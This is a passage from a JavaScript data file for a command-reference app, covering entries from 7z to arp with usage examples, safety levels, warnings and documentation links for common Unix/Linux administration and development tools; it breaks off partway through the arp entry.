/**
 * TL;DRx Commands Database - Comprehensive Edition
 * 
 * A comprehensive collection of 578 Unix/Linux commands with descriptions, examples,
 * platform support information, categorization, and advanced features.
 * 
 * Generated from 57 JSON source files on 2025-09-02
 * 
 * @fileoverview Comprehensive command database for the TL;DR application
 * @version 2.0.0
 * @created 2025-09-02
 * @commands 578
 */

/**
 * Comprehensive commands database containing 578 unique Unix/Linux commands
 * Each command includes name, description, examples, platform support, category, and advanced metadata
 * 
 * @type {Array<Object>}
 * @property {string} name - Command name (e.g., 'ls', 'grep')
 * @property {string} subtitle - What the command abbreviation means
 * @property {string} description - Brief explanation of command purpose
 * @property {Array<string>} examples - Practical usage examples with comments
 * @property {Array<string>} platform - Supported platforms ['linux', 'mac', 'windows']
 * @property {string} category - Command category for organization
 * @property {string} safety - Safety level: 'safe', 'caution', 'dangerous', 'unknown'
 * @property {string} syntaxPattern - Command syntax pattern
 * @property {Array} prerequisites - Prerequisites for using the command
 * @property {Array} commandCombinations - Complex command workflows
 * @property {Array} relatedCommands - Related commands and alternatives
 * @property {Array<string>} warnings - Important warnings and gotchas
 * @property {Array} documentation - Platform-specific documentation links
 * @property {Object} distroNotes - Distribution-specific notes
 */
const commandsDatabase = [
  {
    "name": "7z",
    "subtitle": "7-Zip",
    "description": "High compression ratio archiver supporting many formats",
    "examples": [
      "7z a backup.7z folder/  # Create 7z archive of entire directory",
      "7z x archive.7z  # Extract all files maintaining directory structure",
      "7z l package.7z  # Show files inside archive without extracting",
      "7z a -p secret.7z confidential/  # Create encrypted archive with password prompt",
      "7z a -mx9 ultra.7z large-files/  # Use highest compression level for smallest size",
      "7z t backup.7z  # Verify archive is not corrupted",
      "7z a archive.7z *.txt  # Create archive with all txt files",
      "7z e archive.7z  # Extract files from archive to current directory"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "7z <command> [options] <archive> [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup with compression comparison",
        "commands": "7z a backup.7z data/ && 7z a -mx1 fast.7z data/ && ls -lh *.7z",
        "explanation": "Create normal and fast compression, compare sizes",
        "title": "7z && 7z && ls"
      },
      {
        "scenario": "Extract specific file types",
        "commands": "7z x archive.7z '*.txt' -o./text-files/",
        "explanation": "Extract only text files to specific directory",
        "title": "7z"
      }
    ],
    "relatedCommands": [
      {
        "name": "zip",
        "relationship": "alternative",
        "reason": "7z supports ZIP format and many others"
      },
      {
        "name": "tar",
        "relationship": "similar",
        "reason": "Both create archives, 7z has better compression"
      },
      {
        "name": "rar",
        "relationship": "similar",
        "reason": "Another high-compression archive format"
      }
    ],
    "warnings": [
      "Command syntax different from tar/zip",
      "Password protection uses different flags than other tools",
      "Some Linux distributions need p7zip-full package",
      "Password-protected archives use AES-256 encryption",
      "Ultra compression (-mx9) can be very slow on large files"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://manpages.ubuntu.com/manpages/bionic/man1/7z.1.html"
      },
      {
        "platform": "windows",
        "url": "https://www.7-zip.org/download.html"
      },
      {
        "platform": "generic",
        "url": "https://7ziphelp.com/7zip-command-line"
      }
    ],
    "distroNotes": {
      "linux": "Install via package manager: apt install p7zip-full",
      "macos": "Install via Homebrew: brew install p7zip",
      "windows": "Built into Windows or download 7-Zip"
    }
  },
  {
    "name": "ab",
    "subtitle": "Apache Bench",
    "description": "Apache HTTP server benchmarking tool",
    "examples": [
      "ab -n 1000 -c 10 http://example.com/  # Send 1000 requests with concurrency of 10",
      "ab -n 1000 -c 10 -k http://example.com/  # Use HTTP keep-alive connections for testing",
      "ab -n 100 -c 5 -p data.json -T 'application/json' http://api.example.com/endpoint  # Test POST endpoint with JSON data",
      "ab -n 500 -c 5 -A username:password http://example.com/protected/  # Test protected endpoint with basic auth",
      "ab -n 100 -c 5 -H 'Accept: application/json' http://api.example.com/  # Include custom HTTP headers in requests",
      "ab -n 100 -c 10 http://example.com/  # 100 requests with 10 concurrent connections",
      "ab -t 30 -c 10 http://example.com/  # Run for 30 seconds with 10 concurrent connections",
      "ab -n 500 -c 25 -g results.gnuplot http://example.com/  # Output results for gnuplot"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "ab [options] [http[s]://]hostname[:port]/path",
    "prerequisites": [
      "networking"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive API load test",
        "commands": "ab -n 1000 -c 20 -g results.tsv http://api.example.com/ && gnuplot plot-results.plt",
        "explanation": "Run load test and generate performance graphs",
        "title": "ab && gnuplot"
      }
    ],
    "relatedCommands": [
      {
        "name": "wrk",
        "relationship": "modern-alternative",
        "reason": "wrk provides more advanced load testing capabilities"
      },
      {
        "name": "curl",
        "relationship": "simple-alternative",
        "reason": "curl can test individual requests"
      }
    ],
    "warnings": [
      "Don't run against production servers without permission",
      "High concurrency can overwhelm target servers",
      "Only supports HTTP 1.0 protocol",
      "Single-threaded regardless of concurrency level",
      "Always test from different machine than target server"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://httpd.apache.org/docs/2.4/programs/ab.html"
      },
      {
        "platform": "linux",
        "url": "https://linux.die.net/man/1/ab"
      }
    ],
    "distroNotes": {
      "linux": "Part of apache2-utils package",
      "macos": "Pre-installed with system",
      "windows": "Available with Apache HTTP Server installation"
    }
  },
  {
    "name": "act",
    "subtitle": "Act",
    "description": "Run GitHub Actions locally using Docker",
    "examples": [
      "act push  # Execute GitHub Actions workflow for push event",
      "act pull_request  # Simulate pull request workflow locally",
      "act -l  # Show all workflows and jobs that can be run",
      "act -j test  # Execute only the 'test' job from workflow",
      "act -P ubuntu-latest=nektos/act-environments-ubuntu:18.04  # Override default runner image",
      "act --secret-file .secrets  # Load environment secrets from file",
      "act  # Run default push event",
      "act -n  # Dry run mode to see what would execute",
      "act -s GITHUB_TOKEN=token123  # Run with secret",
      "act --var ENVIRONMENT=dev  # Run with variable",
      "act -v  # Enable verbose logging"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "act [event] [options]",
    "prerequisites": [
      "docker"
    ],
    "commandCombinations": [
      {
        "scenario": "Test workflow before push",
        "commands": "act -l && act push --dryrun && act push",
        "explanation": "List workflows, dry run, then execute",
        "title": "act && act && act"
      },
      {
        "scenario": "Debug failing workflow",
        "commands": "act push --verbose --container-architecture linux/amd64",
        "explanation": "Run with verbose logging and specific architecture",
        "title": "act"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "act requires Docker to run GitHub Actions locally"
      },
      {
        "name": "github-cli",
        "relationship": "combo",
        "reason": "Both tools work with GitHub repositories"
      },
      {
        "name": "git",
        "relationship": "combo",
        "reason": "act runs in Git repositories with GitHub Actions"
      }
    ],
    "warnings": [
      "Requires Docker to be running",
      "Some GitHub-specific features may not work locally",
      "Large runner images can be 17GB in size",
      "Not all GitHub Actions marketplace actions work locally",
      "Secrets are handled differently than in GitHub"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://github.com/nektos/act"
      },
      {
        "platform": "generic",
        "url": "https://nektosact.com/usage/index.html"
      }
    ],
    "distroNotes": {
      "linux": "Install via curl script or package manager",
      "macos": "Available via Homebrew: brew install act",
      "windows": "Available via Chocolatey: choco install act-cli"
    }
  },
  {
    "name": "aide",
    "subtitle": "Advanced Intrusion Detection Environment",
    "description": "Advanced Intrusion Detection Environment for file integrity monitoring",
    "examples": [
      "aide --init  # Create initial database of file system state",
      "aide --check  # Compare current state with baseline database",
      "aide --update  # Update baseline database with current state",
      "aide --compare  # Compare two AIDE databases",
      "aide --config-check  # Verify configuration file syntax",
      "aide --check --report=detailed  # Generate detailed integrity report"
    ],
    "platform": [
      "linux"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "aide [options] [command]",
    "prerequisites": [
      "root"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete integrity monitoring setup",
        "commands": "aide --init && cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db && aide --check",
        "explanation": "Initialize, install, and run first integrity check",
        "title": "aide && cp && aide"
      }
    ],
    "relatedCommands": [
      {
        "name": "tripwire",
        "relationship": "alternative",
        "reason": "Commercial file integrity monitoring tool with similar capabilities"
      },
      {
        "name": "auditd",
        "relationship": "complementary",
        "reason": "Provides detailed audit logs of who/when/how changes were made"
      },
      {
        "name": "rkhunter",
        "relationship": "complementary",
        "reason": "Rootkit hunter that works alongside AIDE for comprehensive security"
      }
    ],
    "warnings": [
      "Requires root privileges to access all system files",
      "Database initialization can take significant time on large systems",
      "Attackers with root access can potentially compromise AIDE",
      "Regular database updates needed after legitimate system changes",
      "Does not identify who made changes or when they occurred"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://aide.github.io/"
      },
      {
        "platform": "rhel",
        "url": "https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/security_hardening/checking-integrity-with-aide_security-hardening"
      }
    ],
    "distroNotes": {
      "rhel": "Available in base repository, configuration in /etc/aide.conf",
      "suse": "Not installed by default, requires manual installation",
      "ubuntu": "Available via apt package manager as 'aide' package",
      "debian": "Available in main repository, similar configuration to RHEL"
    }
  },
  {
    "name": "alembic",
    "subtitle": "Alembic",
    "description": "Database migration tool for Python SQLAlchemy",
    "examples": [
      "alembic init alembic  # Create new Alembic migration environment",
      "alembic revision --autogenerate -m 'Add users table'  # Generate migration script from model changes",
      "alembic upgrade head  # Upgrade database to latest migration",
      "alembic downgrade -1  # Downgrade database by one revision",
      "alembic current  # Display current database revision",
      "alembic history --verbose  # Show detailed migration history",
      "alembic revision -m 'Custom data migration'  # Create blank migration for custom changes",
      "alembic upgrade ae1027a6acf  # Upgrade to specific migration revision",
      "alembic upgrade head --sql  # Generate SQL without applying migrations"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "alembic <command> [options]",
    "prerequisites": [
      "python",
      "sqlalchemy"
    ],
    "commandCombinations": [
      {
        "scenario": "Model-driven development workflow",
        "commands": "alembic revision --autogenerate -m 'Update schema' && alembic upgrade head && alembic current",
        "explanation": "Generate migration from models, apply it, and confirm",
        "title": "alembic && alembic && alembic"
      }
    ],
    "relatedCommands": [
      {
        "name": "python",
        "relationship": "dependency",
        "reason": "Alembic is a Python package requiring Python runtime"
      },
      {
        "name": "pip",
        "relationship": "installation",
        "reason": "Used to install Alembic via pip install alembic"
      },
      {
        "name": "flask",
        "relationship": "integration",
        "reason": "Often used with Flask-Migrate for Flask applications"
      }
    ],
    "warnings": [
      "Always backup database before running migrations in production",
      "Review auto-generated migrations before applying them",
      "Test migrations on development environment first",
      "Downgrade operations may result in data loss",
      "Configuration file must have correct database URL"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://alembic.sqlalchemy.org/en/latest/"
      },
      {
        "platform": "pypi",
        "url": "https://pypi.org/project/alembic/"
      }
    ],
    "distroNotes": {
      "python": "Install via pip: pip install alembic",
      "requirements": "Requires SQLAlchemy and database driver packages"
    }
  },
  {
    "name": "alert-manager",
    "subtitle": "Prometheus AlertManager",
    "description": "Handles alerts from Prometheus and routes them to notification channels",
    "examples": [
      "alertmanager --config.file=alertmanager.yml  # Start AlertManager with configuration file",
      "alertmanager --web.listen-address=:9093  # Start on custom port",
      "amtool config show  # Show current configuration",
      "amtool alert query alertname=DiskSpaceLow  # Query specific alerts",
      "amtool silence add alertname=DiskSpaceLow  # Create silence for alert",
      "amtool silence expire $(amtool silence query -q)  # Expire all silences",
      "curl -XPOST localhost:9093/-/reload  # Reload configuration"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "alertmanager [flags] / amtool <command> [options]",
    "prerequisites": [
      "prometheus"
    ],
    "commandCombinations": [
      {
        "scenario": "Cluster setup",
        "commands": "alertmanager --config.file=alertmanager.yml --cluster.peer=alertmanager-2:9094",
        "explanation": "Start AlertManager in cluster mode",
        "title": "alertmanager"
      }
    ],
    "relatedCommands": [
      {
        "name": "prometheus",
        "relationship": "dependency",
        "reason": "Prometheus sends alerts to Alertmanager for processing"
      },
      {
        "name": "grafana",
        "relationship": "complementary",
        "reason": "Often used together for monitoring and alerting visualization"
      },
      {
        "name": "curl",
        "relationship": "utility",
        "reason": "Used to interact with Alertmanager HTTP API"
      }
    ],
    "warnings": [
      "Configuration syntax errors prevent service startup",
      "Missing notification channels can cause alert delivery failures",
      "High availability clustering requires proper network configuration",
      "Webhook URLs must be accessible from Alertmanager instance",
      "Rate limiting may affect alert delivery during storms"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://prometheus.io/docs/alerting/latest/alertmanager/"
      },
      {
        "platform": "github",
        "url": "https://github.com/prometheus/alertmanager"
      }
    ],
    "distroNotes": {
      "linux": "Available as Docker container or compiled binary",
      "kubernetes": "Often deployed as StatefulSet with persistent storage",
      "docker": "Official image: quay.io/prometheus/alertmanager"
    }
  },
  {
    "name": "alias",
    "subtitle": "Create command shortcuts",
    "description": "Create temporary or permanent shortcuts for longer commands in the shell",
    "examples": [
      "alias ll='ls -la'  # Create shortcut for detailed directory listing",
      "alias ..='cd ..'  # Quick way to go up one directory",
      "alias c='clear'  # Clear screen shortcut",
      "alias update='sudo apt update && sudo apt upgrade'  # System update shortcut",
      "alias  # List all current aliases",
      "unalias ll  # Remove an alias",
      "alias grep='grep --color=auto'  # Add color to grep output"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "shell",
    "safety": "dangerous",
    "syntaxPattern": "alias [name[=value]]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Make aliases permanent",
        "commands": "echo \"alias ll='ls -la'\" >> ~/.bashrc && source ~/.bashrc",
        "explanation": "Add alias to shell configuration for permanent use",
        "title": "echo >> && source"
      },
      {
        "scenario": "Create temporary alias for session",
        "commands": "alias backup='tar -czf backup_$(date +%Y%m%d).tar.gz'",
        "explanation": "Create alias that includes current date in backup filename",
        "title": "alias"
      }
    ],
    "relatedCommands": [
      {
        "name": "unalias",
        "relationship": "opposite",
        "reason": "Remove defined aliases"
      },
      {
        "name": "which",
        "relationship": "info",
        "reason": "Check if command is an alias or executable"
      },
      {
        "name": "type",
        "relationship": "info",
        "reason": "Show whether command is alias, builtin, or external"
      }
    ],
    "warnings": [
      "Aliases are only available in current shell session unless saved to config",
      "Cannot use aliases in shell scripts by default",
      "Aliases with spaces or special characters need proper quoting"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/bash.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/alias.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/bash/manual/bash.html#Aliases"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "ansible",
    "subtitle": "Configuration management and automation",
    "description": "Agentless automation tool for configuration management, application deployment, and task execution",
    "examples": [
      "ansible all -m ping  # Test connectivity to all hosts",
      "ansible webservers -m shell -a 'uptime'  # Run shell command on webservers group",
      "ansible all -m setup  # Gather facts from all hosts",
      "ansible-playbook site.yml  # Run a playbook",
      "ansible all -m copy -a 'src=file.txt dest=/tmp/'  # Copy file to all hosts",
      "ansible database -m service -a 'name=postgresql state=started'  # Manage services",
      "ansible all -m package -a 'name=vim state=present'  # Install package on all hosts"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "caution",
    "syntaxPattern": "ansible [pattern] -m [module] -a '[module options]'",
    "prerequisites": [
      "python3",
      "ssh"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete deployment workflow",
        "commands": "ansible all -m ping && ansible-playbook --check deploy.yml && ansible-playbook deploy.yml",
        "explanation": "Tests connectivity, previews changes, then executes deployment",
        "title": "ansible && ansible && ansible"
      },
      {
        "scenario": "Update and restart services",
        "commands": "ansible webservers -m yum -a 'name=httpd state=latest' && ansible webservers -m service -a 'name=httpd state=restarted'",
        "explanation": "Updates Apache package and restarts the service",
        "title": "ansible && ansible"
      }
    ],
    "relatedCommands": [
      {
        "name": "ansible-galaxy",
        "relationship": "subcommand",
        "reason": "Manages Ansible roles and collections from Ansible Galaxy"
      },
      {
        "name": "terraform",
        "relationship": "complement",
        "reason": "Terraform provisions infrastructure, Ansible configures it"
      },
      {
        "name": "ssh",
        "relationship": "dependency",
        "reason": "Ansible uses SSH for connecting to managed hosts"
      }
    ],
    "warnings": [
      "Can make system-wide changes across many servers simultaneously",
      "Always test playbooks in staging environment first",
      "Requires proper SSH key management for security",
      "Modules run with privileges of connecting user unless --become used",
      "Failed tasks may leave systems in inconsistent state"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.ansible.com/ansible/latest/user_guide/index.html"
      }
    ],
    "distroNotes": {
      "windows": "Available through WSL, native support in recent versions",
      "linux": "Available in most distribution repositories",
      "macos": "Can be installed via pip or Homebrew"
    }
  },
  {
    "name": "ant",
    "subtitle": "Apache Ant build tool",
    "description": "Java library and command-line build tool for automating software build processes",
    "examples": [
      "ant  # Run default target in build.xml",
      "ant compile  # Run specific target named 'compile'",
      "ant -f mybuild.xml  # Use custom build file",
      "ant -projecthelp  # List available targets with descriptions",
      "ant -verbose compile  # Run with verbose output",
      "ant -Dproperty=value compile  # Set property from command line",
      "ant clean compile jar  # Run multiple targets in sequence"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ant [options] [target [target2 [target3] ...]]",
    "prerequisites": [
      "java"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete build workflow",
        "commands": "ant clean && ant compile && ant test && ant jar",
        "explanation": "Clean, compile, test, and create JAR file",
        "title": "ant && ant && ant && ant"
      }
    ],
    "relatedCommands": [
      {
        "name": "maven",
        "relationship": "successor",
        "reason": "Maven provides more features and conventions"
      },
      {
        "name": "gradle",
        "relationship": "modern-alternative",
        "reason": "Gradle is more flexible and modern"
      }
    ],
    "warnings": [
      "Uses XML build.xml files for configuration",
      "Very flexible but can become verbose",
      "Still used in many legacy Java projects"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://ant.apache.org/manual/"
      },
      {
        "platform": "macos",
        "url": "https://ant.apache.org/manual/"
      },
      {
        "platform": "windows",
        "url": "https://ant.apache.org/manual/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "apache2",
    "subtitle": "Apache HTTP Server",
    "description": "Apache HTTP Server for web hosting and applications",
    "examples": [
      "apache2ctl start  # Start Apache web server",
      "apache2ctl stop  # Stop Apache web server", 
      "apache2ctl restart  # Restart Apache server",
      "apache2ctl configtest  # Test configuration file syntax",
      "apache2ctl graceful  # Graceful restart without dropping connections",
      "apache2 -t  # Test configuration syntax",
      "apache2 -S  # Show virtual host configuration",
      "apache2ctl status  # Show server status information"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "apache2ctl <command> / apache2 [options]",
    "prerequisites": [
      "root"
    ],
    "commandCombinations": [
      {
        "scenario": "Deploy new site configuration",
        "commands": "sudo a2ensite mysite.conf && apache2ctl configtest && sudo apache2ctl reload",
        "explanation": "Enable site, test config, then reload Apache",
        "title": "sudo && apache2ctl && sudo"
      },
      {
        "scenario": "Enable SSL for site",
        "commands": "sudo a2enmod ssl && sudo a2ensite mysite-ssl.conf && sudo apache2ctl graceful",
        "explanation": "Enable SSL module, enable SSL site, graceful restart",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "nginx",
        "relationship": "alternative",
        "reason": "Alternative web server with different architecture"
      },
      {
        "name": "systemctl",
        "relationship": "combo",
        "reason": "Manage Apache as systemd service"
      },
      {
        "name": "certbot",
        "relationship": "combo",
        "reason": "Automate SSL certificate management"
      }
    ],
    "warnings": [
      "Module and site management commands vary by distribution",
      "Configuration syntax different from nginx",
      "Performance tuning requires understanding of MPM modules"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://httpd.apache.org/docs/2.4/"
      },
      {
        "platform": "macos",
        "url": "https://httpd.apache.org/docs/2.4/"
      },
      {
        "platform": "windows",
        "url": "https://httpd.apache.org/docs/2.4/platform/windows.html"
      },
      {
        "platform": "generic",
        "url": "https://httpd.apache.org/docs/2.4/getting-started.html"
      }
    ],
    "distroNotes": {
      "linux": "Package name varies: apache2 (Debian/Ubuntu), httpd (RHEL/CentOS)",
      "macos": "Pre-installed or via Homebrew",
      "windows": "Download from Apache Lounge or use XAMPP"
    }
  },
  {
    "name": "apt",
    "subtitle": "Advanced Package Tool",
    "description": "Advanced Package Tool for Debian/Ubuntu package management",
    "examples": [
      "sudo apt update  # Refresh list of available packages and versions",
      "sudo apt upgrade  # Install newer versions of all installed packages",
      "sudo apt install nginx  # Download and install nginx web server",
      "sudo apt remove package-name  # Uninstall package but keep configuration files",
      "apt search python3  # Find packages related to python3",
      "apt show firefox  # Display detailed information about firefox package",
      "sudo apt autoremove && sudo apt autoclean  # Remove unused packages and clean download cache"
    ],
    "platform": [
      "linux"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "apt [options] <command> [package]",
    "prerequisites": [
      "root"
    ],
    "commandCombinations": [
      {
        "scenario": "Full system update",
        "commands": "sudo apt update && sudo apt upgrade && sudo apt autoremove",
        "explanation": "Update database, upgrade packages, clean unused dependencies",
        "title": "sudo && sudo && sudo"
      },
      {
        "scenario": "Install development environment",
        "commands": "sudo apt update && sudo apt install -y git curl vim build-essential",
        "explanation": "Install essential development tools in one command",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "apt-get",
        "relationship": "similar",
        "reason": "Older interface with same functionality"
      },
      {
        "name": "dpkg",
        "relationship": "combo",
        "reason": "Low-level package manager that apt uses"
      },
      {
        "name": "snap",
        "relationship": "alternative",
        "reason": "Universal package manager on Ubuntu"
      }
    ],
    "warnings": [
      "Always run 'apt update' before installing packages",
      "Requires sudo for most operations",
      "Package names may differ from upstream project names"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/apt.8.html"
      },
      {
        "platform": "generic",
        "url": "https://ubuntu.com/server/docs/package-management"
      }
    ],
    "distroNotes": {
      "linux": "Debian, Ubuntu, and derivatives only"
    }
  },
  {
    "name": "ar",
    "subtitle": "Archive",
    "description": "Create and manage static library archives",
    "examples": [
      "ar rcs libmylib.a object1.o object2.o  # Create static library from object files",
      "ar tv libmylib.a  # List files in static library archive",
      "ar x libmylib.a  # Extract all object files from archive",
      "ar r libmylib.a newobject.o  # Add object file to existing archive"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ar [operation] archive [files]",
    "prerequisites": [
      "gcc"
    ],
    "commandCombinations": [
      {
        "scenario": "Build static library",
        "commands": "gcc -c *.c && ar rcs libproject.a *.o && ranlib libproject.a",
        "explanation": "Compile sources and create indexed static library",
        "title": "gcc && ar && ranlib"
      }
    ],
    "relatedCommands": [
      {
        "name": "ranlib",
        "relationship": "combo",
        "reason": "ranlib creates index for faster library linking"
      },
      {
        "name": "nm",
        "relationship": "related",
        "reason": "nm examines symbols in object files and archives"
      }
    ],
    "warnings": [
      "Primarily used for static libraries in development",
      "Different from general-purpose archive formats"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ar.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ar.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/ar.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "arduino-cli",
    "subtitle": "Arduino Command Line Interface",
    "description": "Arduino command line interface",
    "examples": [
      "arduino-cli sketch new MyProject  # Generates new Arduino project with basic structure",
      "arduino-cli board list  # Shows all Arduino boards connected via USB",
      "arduino-cli compile --fqbn arduino:avr:uno MyProject  # Compiles Arduino sketch for Uno board",
      "arduino-cli upload -p /dev/ttyACM0 --fqbn arduino:avr:uno MyProject  # Uploads compiled sketch to Arduino board",
      "arduino-cli lib install 'DHT sensor library'  # Downloads and installs DHT sensor library"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "arduino-cli [command] [options]",
    "prerequisites": [
      "arduino-ide-optional"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete Arduino development workflow",
        "commands": "arduino-cli sketch new MyProject && arduino-cli compile --fqbn arduino:avr:uno MyProject && arduino-cli upload -p /dev/ttyACM0 --fqbn arduino:avr:uno MyProject",
        "explanation": "Creates new project, compiles it, and uploads to Arduino board",
        "title": "arduino && arduino && arduino"
      },
      {
        "scenario": "Install core and compile project",
        "commands": "arduino-cli core install arduino:avr && arduino-cli compile --fqbn arduino:avr:uno MyProject",
        "explanation": "Installs Arduino AVR core and compiles project for Uno",
        "title": "arduino && arduino"
      }
    ],
    "relatedCommands": [
      {
        "name": "platformio",
        "relationship": "alternative",
        "reason": "More comprehensive IoT development platform supporting multiple boards"
      },
      {
        "name": "esptool",
        "relationship": "specialized",
        "reason": "Specialized tool for ESP32/ESP8266 microcontrollers"
      },
      {
        "name": "avrdude",
        "relationship": "underlying",
        "reason": "Lower-level tool used by Arduino CLI for programming AVR microcontrollers"
      }
    ],
    "warnings": [
      "Board must be connected and detected for upload operations",
      "Correct FQBN (Fully Qualified Board Name) is required for compilation",
      "USB permissions may need to be configured on Linux systems",
      "Some libraries may have dependencies that need separate installation"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://arduino.github.io/arduino-cli/latest/installation/"
      },
      {
        "platform": "macos",
        "url": "https://arduino.github.io/arduino-cli/latest/installation/"
      },
      {
        "platform": "windows",
        "url": "https://arduino.github.io/arduino-cli/latest/installation/"
      },
      {
        "platform": "generic",
        "url": "https://arduino.github.io/arduino-cli/latest/"
      }
    ],
    "distroNotes": {
      "windows": "Available through Arduino IDE installation or standalone download",
      "linux": "Can be installed via package managers or direct download",
      "macos": "Available through Homebrew or Arduino IDE"
    }
  },
  {
    "name": "argocd",
    "subtitle": "Argo CD",
    "description": "GitOps continuous delivery tool for Kubernetes",
    "examples": [
      "argocd login argocd-server.argocd.svc.cluster.local --username admin  # Authenticate with ArgoCD server",
      "argocd app create my-app --repo https://github.com/user/repo --path manifests --dest-server https://kubernetes.default.svc --dest-namespace default  # Create new ArgoCD application from Git repository",
      "argocd app sync my-app  # Synchronize application with Git repository state",
      "argocd app list  # Show all applications managed by ArgoCD",
      "argocd app get my-app  # Display detailed information about specific application",
      "argocd app set my-app --sync-policy automated --auto-prune --self-heal  # Enable automatic synchronization with pruning and self-healing",
      "argocd app delete my-app --cascade  # Delete application and all associated Kubernetes resources",
      "argocd app rollback my-app --revision HEAD-1  # Rollback application to previous Git revision"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "argocd [command] [options]",
    "prerequisites": [
      "kubernetes"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete application deployment",
        "commands": "argocd app create my-app --repo https://github.com/user/repo --path k8s --dest-server https://kubernetes.default.svc --dest-namespace production && argocd app sync my-app && argocd app wait my-app",
        "explanation": "Create application, sync with Git, and wait for healthy status",
        "title": "argocd && argocd && argocd"
      },
      {
        "scenario": "Batch application management",
        "commands": "argocd app list -o name | xargs -I {} argocd app sync {}",
        "explanation": "Synchronize all applications managed by ArgoCD",
        "title": "argocd | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "ArgoCD deploys to Kubernetes clusters"
      },
      {
        "name": "git",
        "relationship": "combo",
        "reason": "ArgoCD synchronizes with Git repositories"
      }
    ],
    "warnings": [
      "Applications must be in same cluster as ArgoCD or configured for remote clusters",
      "Git repository access requires proper credentials configuration",
      "Sync windows can be configured to prevent automatic deployments during specific times",
      "Resource hooks allow custom deployment logic"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://argo-cd.readthedocs.io/en/stable/user-guide/commands/argocd/"
      },
      {
        "platform": "macos",
        "url": "https://argo-cd.readthedocs.io/en/stable/user-guide/commands/argocd/"
      },
      {
        "platform": "windows",
        "url": "https://argo-cd.readthedocs.io/en/stable/user-guide/commands/argocd/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "arp",
    "subtitle": "Address Resolution Protocol",
    "description": "Display and manipulate Address Resolution Protocol cache",
    "examples": [
      "arp -a  # Display all entries in ARP cache",
      "arp 192.168.1.1  # Show ARP entry for specific IP address",
      "arp -s 192.168.1.100 aa:bb:cc:dd:ee:ff  # Add static ARP mapping (requires root)",
      "arp -d 192.168.1.100  # Remove ARP entry from cache",
      "arp -n  # Display IP addresses instead of hostnames"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "dangerous",
    "syntaxPattern": "arp [options] [hostname]",
    "prerequisites": [
      "networking"
    ],
    "commandCombinations": [
      {
        "scenario": "Network device discovery",
        "commands": "ping -c 1 192.168.1.{1..254} 2>/dev/null & arp -a | grep -v incomplete",
